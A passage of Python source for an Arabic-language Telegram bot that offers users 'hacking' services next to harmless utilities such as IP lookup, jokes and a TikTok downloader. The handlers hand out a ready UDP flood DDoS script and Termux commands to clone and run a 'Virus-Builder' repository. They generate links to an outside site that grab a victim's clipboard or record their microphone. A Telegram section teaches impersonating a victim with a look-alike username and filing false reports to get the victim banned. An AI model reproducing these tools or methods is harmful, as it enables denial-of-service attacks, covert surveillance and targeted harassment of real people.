#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
----------------------------

git clone https://github.com/Cyber-Dioxide/Virus-Builder/

cd Virus-Builder

pip install -r requirements.txt

python3 Builder.py

apt update -y 

2-$ apt upgrade -y

وبعدها اختار الحرف y

3-$ termux-setup-storage 

وبعدها

4-$ ls 

5-$ cd storage 

وبعدها 

6-$ ls

وبعدها الأمر الاخير للخروج من التطبيق 

7-$ exit
"""
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
    )

async def telegram_tools(update: Update, context) -> None:
    """ثغرات و بوتات و ادوات تلي"""
    query = update.callback_query
    await query.answer()
    
    text = """
بريدات الشركه
stopCA@telegram.org, abuse@telegram.org, Support_Team@telegram.org

الموضوع 
Illegal image +18


الرساله الاكترونيه 
This robot hurts the Telegram community as it spreads porn 
link bot:     رابط البوت هنا

- طريقة فك حظر حسابك المحضور من المراسله في الخاص:

-اولاً : تدخل الى هذا البوت التالي :
 @spambot 
- ترسل start.
ثانياً  : ارسل هذا خطاء.
ثالثاً  : اضغط نعم.
رابعاً : اضغط لا لم اقم بهذا قط !
انتظر قليلاً سيقوم بالرد عليك : ماذا حدث؟  
خامساَ : تُرسل هذا الكود اليه  .

- لقد تم الأبلاغ عن حسابي بسبب كراهية بعض الناس لي ، لم اقم بمراسله احدهم ، يقومون بلأبلاغ عني بدون ادنى سبب .

- تنتظر نصف ساعه ثم تدخل علا البوت وترسل :   
/start 
- سوف يقوم بالرد عليك بـإنه قد تم فك الحظر عن حسابك.

- انتحال شخصيه.

تقوم بـ انتحال شخصيه الضحيه والابلاغ عنه  ،  تقوم بتعيين حسابك تفس حساب الضحيه بـ الخلفيه والنبذه وحتى اسم المستخدم ،  مثلا لو كان اسم المستخدم حق الضحيه هكذا  :  
@mohammed771

تقوم بنسخه وتغيير بسيط تسوي فيه بتغيير حرف او زياده حرف من وسط المعرف هكذا  :
@mohaamed771
كي تستطيع تسويته معرف لك. 

ثم تذهب الى بوت الابلاغ عن انتحال الخاص بالشركه. :
@notoscam

تقوم بمراسله الشركه بهذه الرساله  :

Hello I would like to inform you of a problem that happened to me. Someone has impersonated me.  I woud like you to close his account I will attach his information to you .

ثم ترسل لهم معلومات عن منتحل شخصيتك  هكذا

Name : الاسم
User name :معرف الضحيه
Overview :  النبذه 

وتسوي لقطه شاشه لحساب الضحيه وتقوم بإرساله الى البوت مع الصيغ.

وتنتظر لحين تقوم شركه تليجرام بحظره   .

تنويه لا تقوم بتعديل حسابك الى ان يتم حظر الضحيه.


  ≈≈≈≈ ≈≈≈≈ ≈≈≈≈ ≈≈≈≈ ≈≈≈≈ ≈≈≈≈ ≈≈≈≈ ≈≈≈

رابط المراسلة
abuse@telegram.org
الموضوع

The channel publishes violent content

الرسالة الاكترونية
This channel published porn pictures and pictures of girls and delegations of pornographic +18 and publish pictures of families and expose and intimidate women in exchange for material amounts I hope from the company Telegram and cadre respect to shut the channel at a time and thank you very much
Link:القناة
ورح يردو عليك باقرب وقت بس بلغ على القناة شوي

Support_Team@telegram.org

abuse@telegram.org

stopCA@telegram.org

 

كود حظر قنوات تليجرام



كود تطير قنوات تلجرام تعمله في ابلاغ وترسله 
30 مره لقنوات الاباحي 

الكود. 👇

ハッカー世界と架空の世界を作るには、私たちはHRB🔞鳥の攻撃チャンネル電報ではありませんイラクの国に爆弾が表示されま日本クラウンと私たちの国は中国の誇り、世界の王たちは、私たちは私たちの手の中に悪い将来されているを立つ人すべてを破壊する私たちは、将来の王たち、私の兄弟、私のp tのbのkのH B Rレッツありますハッカー世界と架空の世界を作る ** ☜ هنا تحط معرف القناه

كود مضمون 100%
"""
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
    )

# ======================== باقي الدوال ========================

async def generate_random_email(update: Update, context) -> None:
    """Generate a random Gmail address"""
    query = update.callback_query
    await query.answer()
    
    try:
        username_length = random.randint(8, 15)
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=username_length))
        
        if random.choice([True, False]):
            username += str(random.randint(1, 999))
        
        email = f"{username}@gmail.com"
        
        await query.edit_message_text(
            f"📧 **بريد إلكتروني جديد:**\n\n`{email}`\n\n✅ تم إنشاء البريد بنجاح!",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 إنشاء بريد جديد", callback_data='generate_email')],
                [InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]
            ])
        )
    except Exception as e:
        await query.edit_message_text(
            f"⚠️ حدث خطأ: {e}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )

async def unblock_whatsapp(update: Update, context) -> None:
    """Show WhatsApp unblock guide"""
    query = update.callback_query
    await query.answer()
    
    text = """
📱 **فك حظر واتساب - دليل كامل**

---

• ✅ **1. جهّز الرسالة**

انسخ هذه الرسالة وعدّل فقط رقمك فيها:

عزيزي فريق دعم واتساب،

تم حظر رقمي من استخدام واتساب وأرغب في معرفة السبب ورفع الحظر إذا أمكن، لأنني أستخدم واتساب للتواصل مع العائلة والعمل.

رقمي المحظور هو: +967XXXXXXXX

أؤكد أنني لم أخالف شروط الاستخدام، وأرجو منكم إعادة تفعيل حسابي.

مع التحية.

---

✉️ **2. أرسل الرسالة إلى هذه الإيميلات:**

ارسل نفس الرسالة إلى كل هذه الإيميلات:

• `smb@support.whatsapp.com`
• `android@support.whatsapp.com`
• `support@support.whatsapp.com`

> **ملاحظة:** الأفضل ترسل من 3 أو 4 إيميلات مختلفة لنفس الرسالة عشان تزيد فرص فك الحظر.

---

🚨 **3. نصائح مهمة:**

✏️ اكتب رقمك مع رمز الدولة، مثل: `+9677xxxxxxx`

🕐 انتظر من 1 إلى 3 أيام للرد.

📩 تابع الإيميلات للرد من واتساب.

---

⚠️ **تنبيه:**

• لا تستخدم واتساب المعدل (مثل GBWhatsApp).
• لا ترسل رسائل جماعية أو إعلانات كثيرة.
• إذا تم حظرك أكثر من مرة، قد يكون الحظر دائم.
"""
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
    )

async def fake_call(update: Update, context) -> None:
    """Show fake call website"""
    query = update.callback_query
    await query.answer()
    
    text = """
📞 **اتصال وهمي**

قم بالدخول إلى الموقع وحط الرقم ثم قم بالاتصال (مسموح مرة باليوم):

🌐 **الموقع:** https://callmyphone.org/app

---

📌 **طريقة الاستخدام:**

1. اذهب إلى الرابط أعلاه
2. أدخل رقمك مع رمز الدولة **بدون + أو 00**
3. مثال: `967XXXXXXXX` (رقم يمني)
4. اضغط على زر الاتصال

---

⚠️ **ملاحظة:** مسموح مرة واحدة فقط في اليوم.
"""
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
    )

async def generate_bot_code(update: Update, context) -> None:
    """Show Telegram bot code"""
    query = update.callback_query
    await query.answer()
    
    bot_code = """import telebot
import requests
import re

TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
bot = telebot.TeleBot(TOKEN)

TIKTOK_REGEX = r"https?://(?:www\\.|vm\\.|vt\\.)?tiktok\\.com/[^\\s]+"

def get_video(url):
    try:
        r = requests.post(
            "https://tikwm.com/api/",
            data={"url": url}
        )
        data = r.json()
        if "data" not in data:
            return None

        video_url = data["data"].get("hdplay") or data["data"].get("play")
        return video_url
    except:
        return None


@bot.message_handler(commands=["start"])
def start(msg):
    bot.reply_to(msg, "ارسل رابط تيك توك وأنا أرجع لك الفيديو 🎥")


@bot.message_handler(func=lambda m: True)
def handle(msg):
    if not msg.text:
        return

    links = re.findall(TIKTOK_REGEX, msg.text)
    if not links:
        return

    for link in links:
        bot.send_chat_action(msg.chat.id, "upload_video")

        video = get_video(link)

        if not video:
            bot.reply_to(msg, "ما قدرت أجيب الفيديو 😢")
            continue

        bot.send_video(msg.chat.id, video, caption="🎬 TikTok Downloaded")

bot.infinity_polling()"""
    
    try:
        with tempfile.NamedTemporaryFile(suffix=".py", delete=False, mode='w', encoding='utf-8') as f:
            f.write(bot_code)
            tmp = f.name
        
        await query.edit_message_text(
            "🤖 **كود بوت تحميل تيك توك:**\n\nتم إرسال الكود كملف لأنه طويل.",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )
        
        with open(tmp, 'rb') as f:
            await update.effective_message.reply_document(
                document=f,
                filename="tiktok_downloader_bot.py",
                caption="🎬 كود بوت تحميل فيديوهات تيك توك بدون علامة مائية"
            )
        
        os.unlink(tmp)
        
    except Exception as e:
        await query.edit_message_text(
            f"⚠️ حدث خطأ أثناء إرسال الكود: {e}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )

async def button(update: Update, context) -> int:
    query = update.callback_query
    await query.answer()

    if query.data == 'website_files':
        await query.edit_message_text("الرجاء إرسال رابط الموقع الذي تريد الحصول على ملف HTML الخاص به. 🌐", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_WEBSITE_URL

    elif query.data == 'ip_info':
        await query.edit_message_text("الرجاء إرسال عنوان IP أو اسم النطاق (Domain) للحصول على معلوماته. 📍", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_IP_INFO_QUERY

    elif query.data == 'generate_email':
        await generate_random_email(update, context)
        return CHOOSING_MAIN_MENU

    elif query.data == 'unblock_whatsapp':
        await unblock_whatsapp(update, context)
        return CHOOSING_MAIN_MENU

    elif query.data == 'fake_call':
        await fake_call(update, context)
        return CHOOSING_MAIN_MENU

    elif query.data == 'generate_bot':
        await generate_bot_code(update, context)
        return CHOOSING_MAIN_MENU

    elif query.data == 'translate_text':
        return await translate_text(update, context)
    
    elif query.data == 'download_tiktok':
        await download_tiktok(update, context)
        return CHOOSING_MAIN_MENU
    
    elif query.data == 'generate_name':
        await generate_name(update, context)
        return CHOOSING_MAIN_MENU
    
    elif query.data == 'social_boost':
        await social_boost(update, context)
        return CHOOSING_MAIN_MENU
    
    elif query.data == 'social_vulnerabilities':
        await social_vulnerabilities(update, context)
        return CHOOSING_MAIN_MENU
    
    elif query.data == 'termux_tools':
        await termux_tools(update, context)
        return CHOOSING_MAIN_MENU
    
    elif query.data == 'telegram_tools':
        await telegram_tools(update, context)
        return CHOOSING_MAIN_MENU

    elif query.data == 'hacking_tools':
        hacking_tools_text = """
• أدوات اختراق الشبكات والأنظمة:

1. Nmap - فحص الشبكات
2. Wireshark - تحليل حزم الشبكة
3. Metasploit - اختبار الثغرات
4. Aircrack-ng - اختراق الواي فاي
5. Burp Suite - اختبار أمان الويب
6. John the Ripper - كسر كلمات المرور
7. Hydra - اختبار قوة كلمات المرور
8. Nikto - ماسح ثغرات ويب
9. SQLmap - استغلال ثغرات SQL
10. Hashcat - كسر التشفير

أدوات لينكس: Kali Linux, Parrot Security OS
"""
        await query.edit_message_text(hacking_tools_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU

    elif query.data == 'search_user':
        await query.edit_message_text("الرجاء إرسال معرف حساب شخص في تليجرام للانتقال إلى حسابه. 🔍", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_TELEGRAM_USER_ID

    elif query.data == 'clipboard_pull':
        user_id = query.from_user.id
        clipboard_link = f"✅- تم إنشاء رابط سحب الحافظة \nhttps://max.powerv1.site/pag/cop.php?ID={user_id}&IDx={user_id}"
        await query.edit_message_text(clipboard_link, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU

    elif query.data == 'victim_sound':
        user_id = query.from_user.id
        victim_sound_link = f"✅- تم إنشاء رابط تسجيل صوت اضحيه\nhttps://max.powerv1.site/pag/mic.php?ID={user_id}&IDx={user_id}"
        await query.edit_message_text(victim_sound_link, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU

    elif query.data == 'how_to_be_hacker':
        how_to_hacker_text = """
• 1. ابدأ بتعلّم أساسيات الكمبيوتر
2. اتقن الشبكات: IP, DNS, TCP/IP
3. استخدم نظام Linux
4. تعلم البرمجة: Python, Bash, C, JavaScript
5. استخدم أدوات اختبار الاختراق
6. افهم الثغرات الأمنية
7. مارس عبر HackTheBox و TryHackMe
8. تعلّم الهندسة الاجتماعية
9. احصل على شهادات CEH أو OSCP
10. كن أخلاقيًا ولا تخرق القانون
"""
        await query.edit_message_text(how_to_hacker_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU

    elif query.data == 'decrypt_roblox':
        await query.edit_message_text("الرجاء إرسال ملف يحتوي على سكربت روبلوكس مشفر (base64 أو تشفير ضعيف) لفك تشفيره. 🔓", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_DECRYPT_ROBLOX_SCRIPT

    elif query.data == 'roblox_account_info':
        await query.edit_message_text("الرجاء إرسال اسم المستخدم (Username) الخاص بحساب روبلوكس للحصول على معلوماته. 👤", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_ROBLOX_USERNAME

    elif query.data == 'decorate_text':
        await query.edit_message_text("الرجاء إرسال النص الذي تريد زخرفته. ✨", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_DECORATE_TEXT

    elif query.data == 'joke':
        await generate_joke(update, context)
        return CHOOSING_MAIN_MENU

    elif query.data == 'ddos_tool':
        ddos_code = """
import socket
import threading
import random
import time
import sys

target_ip = input("IP: ")
target_port = int(input("Port: "))
threads = int(input("Threads: "))

def flood():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(random._urandom(1024), (target_ip, target_port))
        except:
            pass

for _ in range(threads):
    threading.Thread(target=flood).start()
"""
        await query.edit_message_text(f"```python\n{ddos_code}\n```", parse_mode='MarkdownV2', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU
    
    elif query.data == 'ddos_explain':
        await ddos_explain(update, context)
        return CHOOSING_MAIN_MENU
    
    elif query.data == 'deepseek_prompt':
        await deepseek_prompt(update, context)
        return CHOOSING_MAIN_MENU

    elif query.data == 'check_link':
        await query.edit_message_text("الرجاء إرسال الرابط الذي تريد فحصه. 🔗", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_CHECK_LINK_URL

    elif query.data == 'generate_password':
        await generate_strong_password(update, context)
        return CHOOSING_MAIN_MENU

    elif query.data == 'instructions':
        instructions_text = """
📜 شروط الاستخدام:

أتعهد أنا المستخدم للتطبيق بأنني:

✅ لن أستخدم التطبيق فيما يغضب الله تعالى.
✅ لن أسرق صور أو حسابات بغرض السرقة أو التجسس على الرسائل.
✅ سأستخدم التطبيق فقط لغرض المزاح اللطيف والربح المشروع.

⚠️ أُبرئ ذمة مالك ومسؤول التطبيق من أي استخدام خاطئ.

✨ الرجاء استخدام التطبيق بما يرضي الله
"""
        await query.edit_message_text(instructions_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU
    
    elif query.data == 'analyze_phone':
        return await analyze_phone_number(update, context)
    
    elif query.data == 'analyze_email':
        return await analyze_email(update, context)

    return CHOOSING_MAIN_MENU

async def get_website_html(update: Update, context) -> int:
    url = update.message.text
    if not url or not (url.startswith('http://') or url.startswith('https://')):
        await update.message.reply_text("الرجاء إرسال رابط صحيح يبدأ بـ http:// أو https:// 🌐", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_WEBSITE_URL

    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        file_name = f"website_{re.sub(r'[\W_]+', '_', url)}.html"
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(str(soup.prettify()))
        await update.message.reply_document(document=open(file_name, 'rb'), filename=file_name, caption="تم استخراج ملف HTML للموقع بنجاح. 📄", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except requests.exceptions.RequestException as e:
        await update.message.reply_text(f"حدث خطأ أثناء جلب محتوى الموقع: {e} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ غير متوقع: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def get_ip_info(update: Update, context) -> int:
    query_text = update.message.text
    if not query_text:
        await update.message.reply_text("الرجاء إرسال عنوان IP أو اسم النطاق (Domain) للحصول على معلوماته. 📍", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_IP_INFO_QUERY

    try:
        ip_address = None
        domain_name = None

        if re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", query_text):
            ip_address = query_text
            domain_name = "غير متوفر"
        else:
            try:
                ip_address = socket.gethostbyname(query_text)
                domain_name = query_text
            except socket.gaierror:
                await update.message.reply_text("تعذر حل اسم النطاق أو عنوان IP غير صالح. ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
                return CHOOSING_MAIN_MENU

        response = requests.get(f"http://ip-api.com/json/{ip_address}")
        response.raise_for_status()
        data = response.json()

        if data.get("status") == "success":
            info_text = f"🌐 الدومين: {domain_name}\n"
            info_text += f"📟 عنوان IP: {data.get('query', 'غير متوفر')}\n"
            info_text += f"🏳️ الدولة: {data.get('country', 'غير متوفر')}\n"
            info_text += f"🏙️ المدينة: {data.get('city', 'غير متوفر')}\n"
            info_text += f"🌍 القارة: {data.get('continent', 'غير متوفر')}\n"
            info_text += f"🛰️ مزود الخدمة (ISP): {data.get('isp', 'غير متوفر')}\n"
            info_text += f"🖥️ المنظمة (Organization): {data.get('org', 'غير متوفر')}\n"
            info_text += f"💼 ASN: {data.get('as', 'غير متوفر')}\n"
            info_text += f"🧭 الإحداثيات: {data.get('lat', 'غير متوفر')}, {data.get('lon', 'غير متوفر')}\n"
            if data.get('lat') and data.get('lon'):
                info_text += f"📌 رابط لعرض الموقع على الخريطة: https://www.google.com/maps?q={data['lat']},{data['lon']}\n"
            else:
                info_text += f"📌 رابط لعرض الموقع على الخريطة: غير متوفر\n"

            if data.get('proxy') or data.get('hosting'):
                info_text += "\n⚠️ ملاحظة: قد يكون الموقع الجغرافي المعروض هو موقع خادم CDN/Proxy وليس بالضرورة موقع الخادم الأصلي."

            await update.message.reply_text(info_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        else:
            await update.message.reply_text(f"تعذر الحصول على معلومات IP: {data.get('message', 'خطأ غير معروف')} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except requests.exceptions.RequestException as e:
        await update.message.reply_text(f"حدث خطأ أثناء الاتصال بخدمة معلومات IP: {e} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ غير متوقع: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def search_telegram_user(update: Update, context) -> int:
    user_id_or_username = update.message.text
    if not user_id_or_username:
        await update.message.reply_text("الرجاء إرسال معرف حساب شخص في تليجرام أو اسم المستخدم. 🔍", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_TELEGRAM_USER_ID

    try:
        if user_id_or_username.isdigit():
            user_link = f"tg://user?id={user_id_or_username}"
            await update.message.reply_text(f"يمكنك الانتقال إلى حساب المستخدم عبر هذا الرابط: [الذهاب للحساب]({user_link}) 🚀", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        elif user_id_or_username.startswith('@'):
            user_link = f"https://t.me/{user_id_or_username[1:]}"
            await update.message.reply_text(f"يمكنك الانتقال إلى حساب المستخدم عبر هذا الرابط: [الذهاب للحساب]({user_link}) 🚀", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        else:
            await update.message.reply_text("الرجاء إدخال معرف حساب تليجرام صحيح (رقم) أو اسم مستخدم يبدأ بـ @. ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ غير متوقع: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def generate_joke(update: Update, context) -> None:
    jokes = [
        "ما هو الشيء الذي يمشي ويقف وليس له أرجل؟ الساعة. 😂",
        "لماذا يضع الفيل طلاء أظافر أحمر؟ ليختبئ في شجرة الفراولة. 🐘💅",
        "ما هو أذكى حيوان؟ الزرافة، لأن رأسها في السحاب. 🦒🧠",
        "ماذا قال الجبل للجبل؟ لم نلتقِ منذ زمن طويل. ⛰️⛰️",
        "لماذا سميت حاسة الشم بهذا الاسم؟ لأنها تشم. 👃",
        "ما هو وجه الشبه بين الكمبيوتر والحفرة؟ كلاهما يحتاج إلى حفر. 💻🕳️",
        "ما هو الشيء الذي كلما أخذت منه كبر؟ الحفرة. 🕳️",
        "ما هو الشيء الذي يرتفع ولا ينزل؟ العمر. 📈",
        "ما هو الشيء الذي له عين واحدة ولا يرى؟ الإبرة. 👁️🧵",
        "ما هو الشيء الذي له أسنان ولا يعض؟ المشط. 🦷"
    ]
    joke = random.choice(jokes)
    await update.callback_query.edit_message_text(f"{joke}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("نكته أخرى 😂", callback_data='joke')], [InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))

async def generate_strong_password(update: Update, context) -> None:
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for i in range(16))
    await update.callback_query.edit_message_text(f"🔑 كلمة مرور قوية جديدة:\n{password}", parse_mode='MarkdownV2', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("توليد كلمة مرور أخرى 🔑", callback_data='generate_password')], [InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))

async def check_link(update: Update, context) -> int:
    url = update.message.text
    if not url or not (url.startswith('http://') or url.startswith('https://')):
        await update.message.reply_text("الرجاء إرسال رابط صحيح يبدأ بـ http:// أو https:// 🔗", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_CHECK_LINK_URL

    try:
        domain = re.findall(r'https?://(?:www\.)?([^/]+)\b', url)[0]

        ip_address = None
        try:
            ip_address = socket.gethostbyname(domain)
        except socket.gaierror:
            await update.message.reply_text("تعذر حل اسم النطاق من الرابط. ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
            return CHOOSING_MAIN_MENU

        response = requests.get(f"http://ip-api.com/json/{ip_address}")
        response.raise_for_status()
        data = response.json()

        if data.get("status") == "success":
            info_text = f"🌐 الدومين: {domain}\n"
            info_text += f"📟 عنوان IP: {data.get('query', 'غير متوفر')}\n"
            info_text += f"🏳️ الدولة: {data.get('country', 'غير متوفر')}\n"
            info_text += f"🏙️ المدينة: {data.get('city', 'غير متوفر')}\n"
            info_text += f"🌍 القارة: {data.get('continent', 'غير متوفر')}\n"
            info_text += f"🛰️ مزود الخدمة (ISP): {data.get('isp', 'غير متوفر')}\n"
            info_text += f"🖥️ المنظمة (Organization): {data.get('org', 'غير متوفر')}\n"
            info_text += f"💼 ASN: {data.get('as', 'غير متوفر')}\n"
            info_text += f"🧭 الإحداثيات: {data.get('lat', 'غير متوفر')}, {data.get('lon', 'غير متوفر')}\n"
            if data.get('lat') and data.get('lon'):
                info_text += f"📌 رابط لعرض الموقع على الخريطة: https://www.google.com/maps?q={data['lat']},{data['lon']}\n"
            else:
                info_text += f"📌 رابط لعرض الموقع على الخريطة: غير متوفر\n"

            if data.get('proxy') or data.get('hosting'):
                info_text += "\n⚠️ ملاحظة: قد يكون الموقع الجغرافي المعروض هو موقع خادم CDN/Proxy وليس بالضرورة موقع الخادم الأصلي."

            await update.message.reply_text(info_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        else:
            await update.message.reply_text(f"تعذر الحصول على معلومات IP للرابط: {data.get('message', 'خطأ غير معروف')} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except requests.exceptions.RequestException as e:
        await update.message.reply_text(f"حدث خطأ أثناء فحص الرابط: {e} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ غير متوقع: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def get_roblox_account_info(update: Update, context) -> int:
    username = update.message.text
    if not username:
        await update.message.reply_text("الرجاء إرسال اسم المستخدم (Username) الخاص بحساب روبلوكس. 👤", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_ROBLOX_USERNAME

    try:
        user_id_response = requests.post(
            "https://users.roblox.com/v1/usernames/users",
            json={"usernames": [username], "excludeBannedUsers": True}
        )
        user_id_response.raise_for_status()
        user_data = user_id_response.json()

        if not user_data or not user_data.get('data'):
            await update.message.reply_text("لم يتم العثور على المستخدم بهذا الاسم. ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
            return CHOOSING_MAIN_MENU

        user_id = user_data['data'][0]['id']
        display_name = user_data['data'][0]['displayName']

        user_details_response = requests.get(f"https://users.roblox.com/v1/users/{user_id}")
        user_details_response.raise_for_status()
        details = user_details_response.json()

        friends_count_response = requests.get(f"https://friends.roblox.com/v1/users/{user_id}/friends/count")
        friends_count_response.raise_for_status()
        friends_count = friends_count_response.json().get('count', 'غير متوفر')

        followers_count_response = requests.get(f"https://friends.roblox.com/v1/users/{user_id}/followers/count")
        followers_count_response.raise_for_status()
        followers_count = followers_count_response.json().get('count', 'غير متوفر')

        created_date_str = details.get('created', 'غير متوفر')
        account_age = "غير متوفر"
        if created_date_str != 'غير متوفر':
            created_date = datetime.fromisoformat(created_date_str.replace('Z', '+00:00'))
            age_delta = datetime.now(created_date.tzinfo) - created_date
            years = age_delta.days // 365
            months = (age_delta.days % 365) // 30
            account_age = f"{years} سنة و {months} شهر"

        info_text = f"معلومات حساب روبلوكس:\n\n"
        info_text += f"👤 اسم المستخدم: {username}\n"
        info_text += f"🆔 معرف الحساب: {user_id}\n"
        info_text += f"✨ الاسم المعروض: {display_name}\n"
        info_text += f"🗓️ تاريخ الإنشاء: {created_date_str.split('T')[0] if created_date_str != 'غير متوفر' else 'غير متوفر'}\n"
        info_text += f"👴 عمر الحساب: {account_age}\n"
        info_text += f"👫 عدد الأصدقاء: {friends_count}\n"
        info_text += f"💖 عدد المتابعين: {followers_count}\n"

